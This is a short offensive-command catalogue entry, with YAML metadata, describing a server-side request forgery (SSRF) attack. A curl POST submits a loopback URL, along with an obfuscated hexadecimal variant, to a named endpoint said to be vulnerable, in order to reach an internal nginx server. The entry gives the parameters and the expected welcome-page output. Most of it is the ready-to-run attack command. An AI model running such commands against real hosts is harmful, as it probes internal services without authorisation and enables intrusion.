---
data: 'curl -X POST -d ''url=http://127.0.0.1/'' https://www.apitest.io/request'
tags:
  - ssrf
  - internal
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.443Z'
id: 1ad5c777-6de7-494a-bdc1-65877ac7890e
verified: false
validated: true
submitted: true
---
# curl-ssrf-loopback-nginx

## Command

```bash
curl -X POST -d 'url=http://127.0.0.1/' https://www.apitest.io/request
```

## Description

Exploits SSRF by submitting a loopback URL to access the internal nginx server and retrieve its welcome page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | Loopback URL payload | Yes |
| `https://www.apitest.io/request` | Vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://127.0.0.1/' https://www.apitest.io/request
```

### Advanced Usage

```bash
curl -X POST -d 'url=http://0x7f.1/' https://www.apitest.io/request
```

## Expected Output

Nginx welcome page HTML: "Congratulations! ... nginx web server installation is working correctly."

## Related

- [[Related Procedure]]
